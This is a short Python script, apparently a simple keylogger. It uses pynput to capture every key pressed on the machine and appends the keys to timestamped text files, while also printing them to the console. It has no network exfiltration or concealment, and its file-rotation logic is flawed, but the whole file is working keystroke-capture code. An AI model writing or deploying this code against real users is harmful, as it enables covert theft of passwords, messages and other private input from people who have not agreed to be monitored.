import pynput
import pynput.keyboard
import codecs
import time
Listener = pynput.keyboard.Listener
now = time.time()
file = str(time.time()) + ".txt"

def write(file,string):
    print(string)
    des = codecs.open(file,"a","utf-8",buffering=0)
    des.write(string)
    des.close()

def on_press(sth):
    global file
    if time.time() - now >= 300:
        file = str(time.time()) + ".txt"
    try:
        out = sth.char + " "
    except:
        out = str(sth) + " "
    write(file,out)

def on_release(sth):
    pass
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
